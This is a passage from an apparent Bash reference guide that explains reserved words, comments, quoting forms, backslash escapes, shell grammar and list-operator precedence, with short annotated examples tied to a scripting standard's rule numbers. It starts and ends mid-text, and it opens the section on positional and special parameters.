mode has a chance to act. They are caught by `bash -n script` (parse
only) and by `shellcheck`, both of which consume the token stream
directly. The remedy is mechanical: run `bash -n` in CI on every
script, or rely on `shellcheck` to flag the whole class.

**See also**: §3.2 (reserved words), §3.4 (quoting overview), §3.10
(grammar), BCS0301.

## 3.2 Reserved words

A small set of identifiers that Bash recognises as syntax keywords when they appear in **command position**. Outside that position they are ordinary tokens. Quoting any character of a reserved word suppresses the recognition entirely — useful occasionally, surprising often.

The full list (Bash 5.2):

```
!  [[  ]]  {  }  case  coproc  do  done  elif  else  esac
fi  for  function  if  in  select  then  time  until  while
```

Recognition contexts (where a token may be parsed as a reserved word):

- Head of a command — `if true; then …`.
- Immediately after another reserved word that introduces a compound — `do`, `then`, `else`, `in`, etc.
- After a list separator — `;`, `&`, `&&`, `||`, newline.

Anywhere else, the same characters are literal. Quoting any character also suppresses recognition: `\if`, `'if'`, `"if"`, `i\f` are all the literal command name `if`. This is occasionally exploited to call an external program named the same as a keyword.

```bash
# scenario: reserved-word recognition vs literal context
if true; then echo if-branch; fi      # `if` recognised, `fi` recognised
# ⇒ if-branch
echo if then else fi                  # `if`, `then`, `else`, `fi` all literal — echo's args
# ⇒ if then else fi
```

```bash
# scenario: quoting suppresses keyword recognition
\if --help 2>&1 | head -1
# ⇒ bash: if: command not found
# (Bash looked up "if" on PATH because the backslash demoted it from keyword to command name)
"if" "[[" "}"                         # all three demoted; PATH lookups, all fail
```

Aliases interact with reserved words: aliases are expanded only after reserved-word recognition, so an alias named `if` is shadowed by the keyword and never fires. Reserved words always win over aliases (and over functions and over builtins) when in a recognition context.

`time` is the lone curiosity — it is a reserved word (so `time pipeline` works at any position where the grammar permits it), not a builtin. Use `command time` or `/usr/bin/time` to get the external GNU `time` (§19.3 explains the resulting differences).

The 1-element subset that BCS scripts touch most often: `function` is permitted but BCS0401 mandates the parameter-less `name() { … }` form, never `function name { … }`.

**See also**: §3.1 (tokenisation — how the parser decides "is this a reserved word here?"), §3.5–§3.6 (single and double quotes — what suppresses recognition), §3.10 (shell grammar productions that introduce these contexts), §4 (functions — `function` reserved word and BCS0401 form mandate).

## 3.3 Comments

The `#` character introduces a comment to end-of-line, but only in specific contexts. The exact rule the parser applies: `#` begins a comment when it is the first character of a token. Mid-token, it is a literal `#`. This trips beginners constantly and footguns experienced scripters in `printf` format strings.

Where `#` is a comment:

- At the start of a line (the prototypical case).
- After whitespace, where a fresh token would begin.
- After most metacharacters and operators (`;`, `&`, `|`, `(`, `)`, newline).

Where `#` is **not** a comment:

- Mid-word: `foo#bar` is a single literal token.
- Inside double quotes: `"hello # world"` — literal hash.
- Inside single quotes: `'#'` — literal hash.
- Inside ANSI-C quoting: `$'#'` — literal hash.
- After `${` — `${var#prefix}` is the prefix-strip operator, not a comment.
- Inside `[[ … ]]`: `#` is treated as a word character (no comment recognition).
- In the digit-position of `${10}` etc. — irrelevant, but worth noting `#` has another role as `${#var}` (length).

```bash
# scenario: contrast leading vs mid-word
echo foo#bar                  # ⇒ foo#bar
echo foo #bar                 # ⇒ foo
echo "foo # bar"              # ⇒ foo # bar
url=https://x#frag            # → assigns the full URL with fragment
echo "$url"                   # ⇒ https://x#frag
result=${url#https://}        # → parameter expansion, # is the strip-prefix op
echo "$result"                # ⇒ x#frag
```

Interactive shells with `interactive_comments` shopt **off** treat `#` as literal even at line start; the default is on, and BCS scripts run with no expectation of disabling it.

BCS comment style (BCS1202): leading `#`-comments only — a comment occupies its own line. End-of-line comments after code are forbidden by the standard. The parser permits them; the standard does not.

```bash
# wrong — end-of-line comment (BCS1202 violation)
declare -i count=0   # how many widgets we have
# right — comment on its own line
# how many widgets we have
declare -i count=0
```

The `#!` "shebang" on line 1 is a comment to Bash but a magic number to the kernel — that line is what selects the interpreter (BCS0102). Anything after the shebang line is parsed normally.

**See also**: §3.1 (tokenisation rules that decide "is this `#` first-of-token?"), §3.5 / §3.6 (quoting that suppresses comment recognition), §5.4 (`${var#prefix}` parameter expansion), BCS1202 (comment style mandate).

## 3.4 Quoting overview

Quoting is the mechanism by which the script author **defers or
suppresses** Bash's expansion behaviour. There are five concrete
forms, each with different rules about what is preserved literally
and what is allowed to expand. Choosing the right one — almost always
double quotes around a variable — is the single most consequential
hygiene decision in shell programming, and the root cause of the vast
majority of "it worked until the filename had a space" bugs.

### The expansion-suppression hierarchy

Read this table top-to-bottom as "quietest first". Each row lists what
the form *allows* through; everything not listed is preserved
literally.

| Form | Suppresses | Allows | Notes |
|------|------------|--------|-------|
| `'…'` (single) | everything | nothing | Cannot contain a literal `'`. |
| `$'…'` (ANSI-C) | most expansion | backslash escape sequences only | Useful for `\t`, `\n`, `\xNN`, `\uNNNN`. |
| `"…"` (double) | word splitting, pathname expansion | `$var`, `${…}`, `$(…)`, `$(( ))`, `` ` `` (history `!` only when interactive) | The default for parameter use. |
| `\c` (backslash) | meaning of one character | n/a | Inside `"…"` only escapes a small set (§3.9). |
| `$"…"` (locale) | as `"…"` | as `"…"` | After expansion, the result is passed to `gettext`. Rare. |
| (unquoted) | nothing | everything | Word splitting and pathname expansion *will* occur. |

### Why `"$var"` is the always-correct default

```bash
# scenario: the same variable expanded with and without quotes.
declare -- file='my report.txt'

ls $file        # wrong — expands to two words: ls "my" "report.txt"
ls "$file"      # right — one argument, exactly as stored
```

Without quotes, the shell first expands `$file` to `my report.txt`
and **then** word-splits the result on `IFS`, producing two arguments.
With quotes, splitting is suppressed. This is not a stylistic
preference; it is a correctness requirement under `set -u` and
`inherit_errexit` (BCS0101). The only legitimate reason to omit the
quotes is when you *want* word splitting — and in that case write
`read -ra` or an explicit `IFS=` redefinition, not bare `$var`, so
the intent is visible.

### Composability

Quoting forms compose by **lexical adjacency**, not nesting. There is
no such thing as a single quote inside a single-quoted string —
adjacent runs are concatenated:

```bash
# scenario: the close-escape-reopen idiom for embedding a literal '.
echo 'it'\''s'      # ⇒ it's
echo "it's"         # ⇒ it's   (cleaner)
echo $'it\'s'       # ⇒ it's   (ANSI-C alternative)
```

Inside `$(…)` or `` `…` ``, quoting is **independent** of the outer
context — the inner shell parses its body afresh. This is why
`"$(grep 'pattern' "$file")"` works: the outer double quotes do not
reach into the substitution.

### When other forms beat double quotes

- Single quotes when the value is a literal that should never be
  re-interpreted: regular expressions, AWK programs, JSON fragments.
- ANSI-C quoting (`$'…'`) when you need control characters by name
  (`$'\t'`, `$'\n'`, `$'\x1b'`) — see §3.7.
- Backslash escape (`\c`) for one or two metacharacters in an
  otherwise-unquoted command (`echo a\ b` is ugly; prefer `echo "a b"`).

### Common mis-quoting patterns

```bash
# wrong — variable will word-split if it contains whitespace.
cp $src $dst

# right — each side is one argument no matter what.
cp -- "$src" "$dst"

# wrong — single-quoted, so $HOME is literal "$HOME".
echo 'home is $HOME'

# right — double-quoted preserves the literal "is" while expanding $HOME.
echo "home is $HOME"
```

The most frequent bug is the first form: a script that worked in
testing because no path had a space, then failed in production
because someone created `My Documents/`. Quote first, optimise later.

### Quoting inside command substitution is independent

`$(…)` and `` `…` `` start a fresh parsing context. The outer quotes
do not reach inside; the inner shell tokenises and parses the body
on its own terms:

```bash
# scenario: outer double quotes; inner single quotes are literal-mode again.
declare -- name='world'
declare -- greeting
greeting="$(printf 'hello, %s\n' "$name")"
printf '%s' "$greeting"
# ⇒ hello, world
```

The inner `'%s\n'` is single-quoted *inside* `$(…)` — it does not
need to be escaped from the outer `"…"`. The same is true of
`$(grep "pattern" "$file")` — the inner `"…"` is not a re-escape of
the outer pair, it is a fresh quoting context. This is one of the
practical advantages of `$(…)` over the legacy backtick form, which
required cumbersome backslash-escaping for nested quotes.

### Strict-mode note

Under `set -u`, an unquoted expansion of an unset variable still
errors, but the diagnostic is far worse: word splitting may produce
zero arguments, silently changing the command's shape before the
unset detection fires. Quoting brings the failure forward to its
true cause.

**See also**: §3.5 (single quotes), §3.6 (double quotes), §3.7 (ANSI-C
quoting), §3.9 (backslash escapes), BCS0301, BCS0303, BCS0307.

## 3.5 Single quotes

Single quotes preserve the literal value of every character within them. **No** expansion of any kind, **no** escape sequences, **no** exception. The only character that cannot appear inside single quotes is a single quote itself; there is no escape for `'` between `'…'` — you must close, escape, and reopen.

The full rules:

- No parameter expansion: `'$var'` is the four characters `$`, `v`, `a`, `r`.
- No command substitution: `'$(cmd)'` is the literal string.
- No arithmetic expansion: `'$((1+1))'` is literal.
- No backslash escaping: `'\n'` is two characters, `\` and `n`.
- Newlines are literal — single quotes span lines without continuation.
- Single quotes do **not** nest inside single quotes; the close-escape-reopen idiom is mandatory.
- Inside double quotes, `'` is itself literal (so a sentence with an apostrophe written inside `"..."` needs no further work).

The close-escape-reopen idiom in code (this is the canonical pattern):

```bash
# scenario: embed a literal single quote inside a single-quoted string
echo 'it'\''s'                # ⇒ it's
# decomposition:
#   'it'   close after "it"
#   \'     escaped single quote (a literal apostrophe in the unquoted gap)
#   's'    reopen, append "s"
# the shell concatenates adjacent quoted/unquoted runs into one word

# scenario: alternative — switch to double quotes (or ANSI-C)
echo "it's"                   # ⇒ it's
echo $'it\'s'                 # ⇒ it's            (ANSI-C, see §3.7)
```

BCS prefers single quotes for **static strings** (BCS0301, BCS0307) — promote single quotes to double quotes only when expansion is actually needed. The rule is positive ("use single quotes for static") rather than negative; the result is a script in which the presence of double quotes signals expansion intent at every site.

```bash
# wrong — double quotes around a static string (BCS0307 anti-pattern)
info "Starting backup..."
# right — single quotes; nothing expands
info 'Starting backup...'
# right — double quotes only because $target is expanded
info "Starting backup of $target..."
```

**See also**: §3.4 (quoting overview — when to reach for which form), §3.6 (double quotes), §3.7 (ANSI-C `$'...'` for control characters and Unicode), BCS0301 (Quoting Fundamentals), BCS0307 (Anti-Patterns).

## 3.6 Double quotes

Double quotes are the workhorse of safe shell programming. They
preserve most characters literally while allowing parameter
expansion, command substitution, and arithmetic expansion — and,
crucially, they suppress word splitting and pathname expansion on the
results. Read every `"$var"` in a Bash script as "this expansion is
exactly one argument, no matter what".

### What is preserved, what is allowed

Inside `"…"`:

- **Allowed to expand:** `$var`, `${var…}`, `$(…)`, `` `…` ``, `$(( ))`.
- **Backslash escapes only these:** `\$`, `` \` ``, `\"`, `\\`, and a
  literal newline (`\<newline>` is line continuation). Every other
  backslash is preserved literally — `"\n"` is a backslash followed
  by an `n`, not a newline. Use `$'\n'` (§3.7) or `printf` for that.
- **`!` is special only in interactive shells** (history expansion). In
  scripts under `set -o`, history is off and `!` is literal.
- **Word splitting and pathname expansion are *not* applied** to the
  expanded result. This is the entire reason for the `"$var"`
  discipline — it converts a multi-word, glob-prone expansion into a
  single, opaque argument.

### The cardinal `"$@"` versus `"$*"` distinction

Both expand to the positional parameters, but the two are not
interchangeable. In a quoted context:

| Form | Result | Use when |
|------|--------|----------|
| `"$@"` | Each positional becomes its own argument: `"$1" "$2" "$3" …` | Forwarding arguments verbatim — almost always. |
| `"$*"` | Positionals joined by the **first character of `IFS`** into one argument: `"$1c$2c$3"` (default `c=' '`). | Building a single display string. |

Unquoted `$@` and `$*` both word-split, so the contents of any
positional containing whitespace will fragment. Always use `"$@"`
unless you have a specific reason for the joined form.

### Worked example: `"$@"` versus `"$*"`

```bash
#!/usr/bin/env bash
# scenario: pass three arguments, one with spaces, and observe the difference.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

set -- 'one' 'two words' 'three'

printf '"$@" form:\n'
for x in "$@"; do printf '  [%s]\n' "$x"; done

printf '"$*" form:\n'
for x in "$*"; do printf '  [%s]\n' "$x"; done

# ⇒ "$@" form:
# ⇒   [one]
# ⇒   [two words]
# ⇒   [three]
# ⇒ "$*" form:
# ⇒   [one two words three]
```

`"$@"` produces three arguments to the loop; `"$*"` produces one.
Forward arguments to a wrapped command with `cmd "$@"`; build a log
line with `printf '%s\n' "args=$*"`.

### Worked example: backslash inside `"…"` is mostly literal

```bash
# scenario: show which backslash sequences the quoting honours.
printf '%s\n' "a\\b"     # ⇒ a\b   (\\ → \)
printf '%s\n' "a\nb"     # ⇒ a\nb  (\n is NOT a newline here)
printf '%s\n' "a\$b"     # ⇒ a$b   (\$ → $)
printf '%b\n' "a\nb"     # ⇒ a
                          #     b   (printf %b honours \n itself)
```

The interpretation of `\n` is `printf`'s job, not the quoting
mechanism's. Inside `"…"`, `\n` is two characters; pass it to
`printf '%b'`, or use `$'\n'` (§3.7) to embed an actual newline at
quote-parse time.

### Adjacency: concatenation without `+`

Bash has no string concatenation operator. Adjacent quoted and
unquoted runs are concatenated by lexical position:

```bash
declare -- name='alice' ext='log'
declare -- file="/var/log/$name"'.bak.'"$ext"
printf '%s\n' "$file"
# ⇒ /var/log/alice.bak.log
```

The quotes can switch back and forth on every character; the parser
treats the whole word as one token. This pattern is occasionally
useful when a literal `'` must sit beside an expansion: `"prefix"'…'"$x"`.

### `"$@"` in function forwarding

The most common use of `"$@"` is the wrapper-function pattern:

```bash
# scenario: forward all arguments to an inner command unchanged.
run_with_logging() {
  local -- log='/var/log/wrap.log'
  printf '[%s] %s\n' "$(date -Is)" "$*" >>"$log"
  command -- "$@"
}
```

`"$*"` is fine for the human-readable log line because it is one
joined string. `"$@"` is mandatory for the actual call so that an
argument like `'two words'` reaches the inner command as a single
parameter. Reversing them is silent breakage that only surfaces on
input the test cases never tried.

### Empty-array edge case

When the positional list is empty, `"$@"` expands to **zero**
arguments — not one empty string. This matters because a wrapper
that does `cmd "$@"` with no args calls `cmd` with no args, exactly
as the user invoked the wrapper. By contrast, an array `"${arr[@]}"`
behaves identically. This zero-argument behaviour is special-cased in
the standard and is one of the small set of POSIX-compliant
behaviours retained by Bash.

### Strict-mode note

Under `set -u`, expansions like `"${var:-}"` give a controlled empty
default and never trigger an unset error. Bare `"$var"` does, which
is usually what you want — quoting protects word boundaries; `:-`
protects against unset. They are orthogonal disciplines.

**See also**: §3.4 (quoting overview), §3.7 (ANSI-C quoting), §3.9
(backslash escapes), §5.7 (parameter expansion), BCS0301, BCS0303.

## 3.7 ANSI-C quoting `$'...'`

A quoting form that interprets backslash escapes the way C does. Use it whenever a literal contains a control character (tab, newline, NUL), a non-ASCII byte, or a Unicode code point that is awkward to embed directly. BCS sanctions this form for escape-sequence emission (BCS0305).

The full escape table:

| Escape       | Result                                          |
|--------------|-------------------------------------------------|
| `\a`         | alert / bell (`0x07`)                           |
| `\b`         | backspace (`0x08`)                              |
| `\e`, `\E`   | ESC (`0x1B`)                                    |
| `\f`         | form feed (`0x0C`)                              |
| `\n`         | newline (`0x0A`)                                |
| `\r`         | carriage return (`0x0D`)                        |
| `\t`         | horizontal tab (`0x09`)                         |
| `\v`         | vertical tab (`0x0B`)                           |
| `\\`         | literal backslash                               |
| `\'`         | literal single quote                            |
| `\"`         | literal double quote                            |
| `\?`         | literal `?` (legacy C trigraph escape)          |
| `\nnn`       | byte with octal value `nnn` (1–3 digits)        |
| `\xHH`       | byte with hex value `HH` (1–2 digits)           |
| `\uHHHH`     | Unicode code point (4 hex digits) — UTF-8 encoded |
| `\UHHHHHHHH` | Unicode code point (8 hex digits) — UTF-8 encoded |
| `\cX`        | control-X (e.g. `\cA` is `0x01`)                |

```bash
# scenario: tab, byte, and Unicode in a single literal
printf '%s\n' $'tab\there\tend' $'byte=\xff' $'café'
# ⇒ tab
# ⇒ byte=
# (line 1 contains literal TABs between words; line 2 ends with a
#  raw 0xFF byte rendered per the terminal's locale)
# ⇒ cafe
# (the source uses `cafe` plus a combining-acute U+0301; the precomposed
#  é (U+00E9) is a different byte sequence)
```

The canonical script idiom — a strict-mode-safe `IFS` literal:

```bash
IFS=$' \t\n'                  # space, tab, newline (BCS1003 — IFS Safety)
```

The runtime alternative is `printf '%b\n'`, which interprets backslash escapes from a value already in a variable. Use ANSI-C quoting for compile-time literals (the parser does the work once) and `%b` for values that arrive from elsewhere.

```bash
# scenario: parse-time vs run-time escape interpretation
greeting=$'hello\tworld'      # interpreted at parse time
printf '%s\n' "$greeting"     # → "hello<TAB>world" (literal tab between words)
raw='hello\tworld'            # the four characters \, t plus rest
printf '%b\n' "$raw"          # → also "hello<TAB>world" (printf interprets \t)
printf '%s\n' "$raw"          # ⇒ hello\tworld
```

**See also**: §3.5 (single quotes — no escapes), §3.6 (double quotes — selective escapes), §3.9 (backslash-escape contexts), §14.5 (`printf` vs `echo` — why `printf '%b'` is the safe runtime form), BCS0305 (Printf Patterns), BCS1003 (IFS Safety).

## 3.8 Locale-translation `$"..."`

Quoting form that triggers a gettext lookup against the program's message catalogue. Used for internationalised scripts.

- `$"text"` — looks up `text` in the active locale's catalogue.
- `gettext.sh` from GNU gettext for setup.
- `TEXTDOMAIN` and `TEXTDOMAINDIR` variables.
- Extracting messages with `xgettext` from shell sources.
- The `noexpand_translation` shopt (Bash 5.2) — suppresses expansion of `$"..."` for security in some contexts.
- Rare in practice; mentioned for completeness.

## 3.9 Backslash escapes

Backslash is the lexical "escape next character" operator, but its meaning depends on the surrounding quoting context. The four contexts each have a different rule, and confusing them is the second-most-common quoting bug after forgetting to quote at all.

The four contexts in one table:

| Context        | Rule                                                                             |
|----------------|----------------------------------------------------------------------------------|
| Unquoted       | `\X` is literal `X`; loses any special meaning. `\<newline>` is line continuation. |
| Inside `"..."` | Escapes only `\$`, `` \` ``, `\"`, `\\`, `\<newline>`. Any other `\X` stays as two characters: `\` and `X`. |
| Inside `'...'` | No interpretation. Backslash is always literal. There is no escape for `'`.       |
| Inside `$'...'`| Full C-style escape table (§3.7).                                                |

One demo per context:

```bash
# scenario: unquoted — backslash demotes a metacharacter
echo a\ b                     # ⇒ a b               (the space is literal)
echo \$HOME                   # ⇒ $HOME             (no expansion)
echo line1\
line2                         # ⇒ line1line2        (line continuation, newline removed)

# scenario: inside double quotes — only the five magic escapes work
echo "price=\$5"              # ⇒ price=$5
echo "path=C:\Users\name"     # ⇒ path=C:\Users\name (the \U and \n are literal pairs)
echo "$(printf 'a\\b')"       # ⇒ a\b               (two-step: printf, then literal)

# scenario: inside single quotes — backslash is just a character
echo '\n is literal'          # ⇒ \n is literal
echo 'C:\Users\name'          # ⇒ C:\Users\name     (no Windows-path agony)

# scenario: inside ANSI-C quoting — full escape table (§3.7)
echo $'tab\there\nend'        # → "tab<TAB>here<LF>end"
                              # ⇒ end
```

The double-quote rule is the subtle one: only five escape sequences are recognised inside `"..."` (`\$`, `` \` ``, `\"`, `\\`, `\<newline>`); any other `\X` stays as **two characters**. This means `"\n"` inside double quotes is literally backslash-n, not a newline. Reach for `$'...'` (§3.7) when newlines are needed.

Line continuation (`\<newline>`) works inside double quotes too — both the backslash and the newline disappear:

```bash
# scenario: long string built across lines
msg="hello \
world"
echo "$msg"                   # ⇒ hello world
```

BCS strongly prefers single quotes for static strings (BCS0301, BCS0307), which sidesteps this maze entirely. Reach for double quotes only when expansion is wanted; reach for `$'…'` only when control characters are needed.

**See also**: §3.4 (quoting overview), §3.5 (single quotes), §3.6 (double quotes), §3.7 (ANSI-C quoting full escape table), BCS0301 (Quoting Fundamentals), BCS0307 (Anti-Patterns).

## 3.10 Shell grammar

Bash's grammar — what the parser builds *after* the tokeniser of §3.1
has emitted its words and operators — is small, recursive, and
hierarchical. Five layers wrap each other from the smallest unit up
to the whole script. Every error message of the form "syntax error
near unexpected token …" is the parser failing to fit a token into
one of the productions below.

### The grammar in BNF form

```bnf
simple-command   ::= [assignment | redirection]* WORD [WORD | redirection]*
pipeline         ::= ['time'] ['!'] command ('|' | '|&') command)*
and-or-list      ::= pipeline (('&&' | '||') pipeline)*
list             ::= and-or-list ((';' | '&' | NEWLINE) and-or-list)* [';' | '&']
compound-command ::= brace-group | subshell | for | case | if | while | until
                   | select | arithmetic-cmd | conditional-cmd
command          ::= simple-command | compound-command | function-definition
function-definition ::= [ 'function' ] WORD [ '(' ')' ] compound-command [ redirection* ]
```

Read each production as "the left side **is** any of the right-side
forms". The recursion is genuine: a `pipeline` can be wrapped in a
`( … )` (subshell, a `compound-command`), which makes it a
`command`, which is the body of another `pipeline`, and so on
indefinitely.

### Layer-by-layer meaning

- **Simple command:** the leaf — a command name with arguments and
  redirections. Assignments may precede the command word (`PATH=/x cmd`).
- **Pipeline:** one or more commands joined by `|` or `|&`; the
  optional `time` reserved word measures wall/CPU time, and the
  optional `!` inverts the final exit status (relevant under `set -e`,
  see §13.2).
- **AND-OR list:** pipelines joined by short-circuit `&&`/`||`. These
  are equal-precedence and **left-associative** — the source of the
  classic `a && b || c` footgun (§3.11).
- **List:** the largest unit Bash treats as one logical command. `;`
  and newline sequence; `&` backgrounds. A trailing `;` is optional;
  a trailing `&` is the difference between sync and async.
- **Compound command:** bracketed structure (`if`, `while`, `for`,
  `case`, `(( ))`, `[[ ]]`, `{ … }`, `( … )`) that itself contains a
  list. Loops and conditionals are commands, not statements.

### Worked example: parse tree of a real pipeline

```bash
# scenario: parse `time ! grep -q ERROR log | wc -l && notify || true`
```

```text
list
└── and-or-list
    ├── pipeline                             ← time ! grep -q ERROR log | wc -l
    │   ├── time              (modifier)
    │   ├── !                 (negation)
    │   ├── simple-command    grep -q ERROR log
    │   └── simple-command    wc -l
    ├── &&  →  pipeline / simple-command     notify
    └── ||  →  pipeline / simple-command     true
```

`time` and `!` attach to the pipeline as a whole; `&&` and `||` join
pipelines into the and-or-list; the trailing newline (or `;`) would
end the list. Note that `time` cannot be applied to the
`and-or-list` as a unit — to time the whole expression you must wrap
it in a brace group: `time { grep … | wc -l && notify || true; }`.

### Worked example: function definition is a compound command

```bash
greet() {
  local -- name="${1:-world}"
  printf 'hello, %s\n' "$name"
}
```

The body `{ … }` is a brace group — itself a `compound-command` —
which under the function-definition production becomes the function's
body. This is why the `}` must be on its own line or preceded by
`;` (the brace group's `list` production requires a terminator before
the closing brace).

### Where redirections attach

A redirection (`>`, `<`, `2>&1`, etc.) is a child of the **simple
command** at lexical level — `cmd > out` redirects only `cmd`. To
redirect the output of a *compound* command, the redirection must
follow the closing keyword:

```bash
{ cmd1; cmd2; } > combined.log    # right — applies to both
( cmd1; cmd2 ) > sub.log          # right — subshell with redirected stdout
while read -r l; do echo "$l"; done < input.txt
```

Redirecting the head of a pipeline only affects that head:
`cmd1 > x | cmd2` discards `cmd1`'s stdout to `x`, leaving `cmd2`
to read whatever `cmd1` writes to `&3` or stderr.

### Why every layer matters in practice

Each layer above introduces a distinct error-handling rule:

- **Simple-command** failure under `set -e` exits the script — unless
  the command is in a tested position (see below).
- **Pipeline** exit status is the rightmost command (default) or the
  rightmost *non-zero* (under `pipefail`, BCS0101). Without
  `pipefail`, `cat missing.txt | head` returns success.
- **AND-OR list** short-circuits: `cmd1 && cmd2` skips `cmd2` if
  `cmd1` fails; `cmd1 || cmd2` skips `cmd2` if `cmd1` succeeds.
- **List**: `cmd1; cmd2` always runs both; `cmd1 & cmd2` backgrounds
  `cmd1` and continues without waiting.

The "tested position" rule for `set -e` (§13.2) is defined in terms
of the grammar layers: a simple command is tested if it is the LHS
of `&&` or `||`, the head of `if`/`while`/`until`, or negated by `!`.
Anything else is untested and a failure exits the script.

### Strict-mode note

`set -e`, `inherit_errexit`, and `pipefail` interact with these
layers at well-defined points: a pipeline's exit status is the **last**
command's by default, or — under `pipefail` — the rightmost non-zero;
`set -e` triggers on any failed simple command not in a tested
position (the LHS of `&&`/`||`, `if`/`while` head, `!`-negated). The
grammar is the substrate; error handling (§13) is the policy on top.

**See also**: §3.1 (tokenisation), §3.2 (reserved words), §3.11
(operator precedence), §7 (control flow), §13.2 (errexit semantics),
BCS0101, BCS0501, BCS0601.

## 3.11 Operator precedence

Bash's *list* operators have a small, tight precedence hierarchy —
distinct from the **arithmetic** operator precedence inside `(( ))`
(§8.10). Misreading the list-level precedence is the root cause of
the most enduring antipattern in shell programming: the use of
`a && b || c` as if it were `if a; then b; else c; fi`. It is not.

### The precedence table (highest to lowest)

| Level | Operators | Associativity | Notes |
|-------|-----------|---------------|-------|
| 1 (tightest) | `\|`, `\|&` (pipeline) | left | Pipelines bind tighter than logical operators. |
| 2 | `time`, `!` | unary, prefix | Apply to the following pipeline only. |
| 3 | `&&`, `\|\|` | **left** | Equal precedence — this is the footgun. |
| 4 | `;`, `&`, newline | left | Sequencing/backgrounding; lowest. |

`( … )` (subshell) and `{ … ; }` (brace group) are not operators —
they are compound commands that re-establish a fresh precedence
context inside, and may be used to override the table above by
explicit grouping.

### Why `&&`/`||` are not if/then/else

```bash
# scenario: a "ternary" attempt that misfires when b returns non-zero.
a && b || c
```

Because `&&` and `||` are equal-precedence and left-associative, the
shell parses this as `(a && b) || c`. So:

- If `a` succeeds **and** `b` succeeds → only `a && b`; `c` skipped.
- If `a` succeeds **and** `b` *fails* → `c` runs (this is the bug).
- If `a` fails → `b` skipped; `c` runs.

The author probably meant "if `a` then `b` else `c`" — but that
contract collapses the moment `b` can fail. Real-world example:
`grep -q pat file && cp file backup || rm -f file`. If `cp` fails
(disk full, permission denied), the file is removed — the opposite
of what was intended.

### Worked example: the gotcha in action

```bash
#!/usr/bin/env bash
# scenario: prove that "$b" running and failing still triggers "$c".
set -uo pipefail   # NB: NOT -e here, so we can observe the path

a() { return 0; }
b() { echo 'b ran'; return 1; }
c() { echo 'c ran'; }

a && b || c
# ⇒ b ran
# ⇒ c ran
```

Both `b` and `c` execute. Under `set -e` the script would also exit
if `b`'s failure were not in a "tested" position — but `&&` *is* a
tested position, so the failure is silently swallowed and `c` fires
regardless. This combination — `set -e` plus `a && b || c` — is the
quietest way to ship a broken script.

### Worked example: explicit grouping fixes it

```bash
# right — actual if/then/else semantics, no ambiguity.
if a; then
  b
else
  c
fi

# right — guarded short-circuit, when c truly is a fallback for a:
a || c
b      # only runs after the guard, regardless of c

# right — when you really do want "try b only if a; never c on b's failure":
if a; then b; fi
```

Reach for `&&`/`||` only when the right-hand side is a *side-effect*
that cannot itself fail (`echo`, `: # noop`, an idempotent log call)
or when you have explicitly grouped: `a && { b; true; } || c`. The
trailing `true` neutralises `b`'s exit status so `||` no longer
fires on a `b` failure.

### `time` and `!` bind to the pipeline only

```bash
time grep pat file | wc -l   # times the WHOLE pipeline (special case)
! grep -q pat file           # inverts grep's exit; pipeline of one
! cmd1 | cmd2                # inverts cmd2's exit (or pipeline's under pipefail)
time cmd1 && cmd2            # times cmd1 only; && joins at lower precedence
```

To time an entire `&&`/`||` chain, group with a brace block:
`time { cmd1 && cmd2; }`.

### Strict-mode note

`set -e` skips failures in "tested" positions: the LHS of `&&`/`||`,
the head of `if`/`while`/`until`, and any pipeline negated with `!`.
This is why `a && b || c` undermines `set -e` — every command in
the chain is in a tested position. Use explicit `if` for control
flow under strict mode; use `&&`/`||` only for safe one-line guards.

**See also**: §3.10 (grammar), §7.1 (`if`), §8.10 (arithmetic
precedence), §13.2 (errexit semantics), BCS0501, BCS0601.

# Part IV — Parameters, Variables, and Arrays

*Bash variables are not all strings. They have types, scopes, attributes, and namespaces. This Part documents the data model: the parameter taxonomy, the `declare` system, scope rules, and the array machinery.*

---

---

## 4.1 Parameter taxonomy

Bash uses one umbrella term — *parameter* — for every named storage
slot the shell can substitute into a word. The taxonomy below is the
mental model the rest of Part IV assumes; every later chapter
specialises one branch of this tree.

### The three classes

```text
parameter
├── positional        $0 $1 … $N   $#   "$@"   "$*"   set --, shift
├── special           $? $$ $! $_ $- $0   (single-character, fixed semantics)
└── shell variable
    ├── user-defined  foo=1   declare -- foo=1   local -- foo=1
    └── shell-set     BASH_*  FUNCNAME  COMP_*  HIST*  PWD  IFS  …
```

A *positional* parameter is set by argument passing — script invocation,
function call, or `set --` (§4.2). A *special* parameter has a
single-character name and a fixed meaning carried by Bash itself
(§4.3, Appendix B). A *shell variable* has a user-readable name and is
set by the user, by Bash, or by the environment via `export` (§4.4,
§4.8, Appendix C). Every parameter lives in exactly one bucket.

### One example per class

```bash
# scenario: a single function exercising all three taxonomy branches
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

inspect() {
  # positional: $1, $#, "$@"
  printf 'argc=%d first=%s\n' "$#" "${1:-<none>}"

  # special: $? from the previous command, $$ for the script PID
  true; printf 'exit=%d  pid=%d\n' "$?" "$$"

  # shell variable (user-defined, function-local — §4.6)
  local -- mood='cheerful'
  printf 'mood=%s\n' "$mood"

  # shell variable (Bash-set — Appendix C)
  printf 'BASH_VERSION=%s\n' "$BASH_VERSION"
}

inspect alpha beta
# ⇒ argc=2 first=alpha
# ⇒ exit=0
# ⇒ mood=cheerful
# ⇒ BASH_VERSION=
# (the BASH_VERSION line ends with the running bash's version string;
#  pid line ends with the script's PID — both runtime-dependent)
```

### Environment versus shell variables

Every shell variable is also an *environment* variable when (and only
when) it carries the export attribute (BCS0204). Marking a variable
exported (`declare -x`, `export`, or assignment-prefix) places it in
the environment passed to child processes; without the attribute the
variable is private to the current shell. Treated in detail in §4.8.

### BCS posture

- Use `declare`/`local` with explicit type flags for every variable
  (BCS0201). Names: `lower_case` for locals, `UPPER_CASE` for globals
  and exports (BCS0203).
- Special parameters are read-only inputs from Bash; never reassign
  `$?`, `$$`, etc.
- Positional forwarding is always `"$@"`, never bare `$@` or `$*`
  (BCS0301).

The full canonical list of special parameters lives in **Appendix B**;
the canonical list of Bash-set shell variables lives in **Appendix C**.

**See also**: §4.2 (positional), §4.3 (special), §4.4 (shell
variables), §4.8 (export and environment), §5.4 (parameter expansion).

## 4.2 Positional parameters

Positional parameters are the numbered arguments delivered to a script,
to a function, or to any block introduced by `set --`. Bash treats all
three sources through a single mechanism: the same `$1`, `$2`, `$#`,
`$@`, `$*` apply unchanged, and the same quoting discipline matters in
each context.

### Names and access

- `$0` — script name as invoked. Inside a function `$0` still refers to
  the script, not the function. `$BASH_SOURCE[0]` is the file the code
  was sourced from; `$FUNCNAME[0]` is the current function name. If
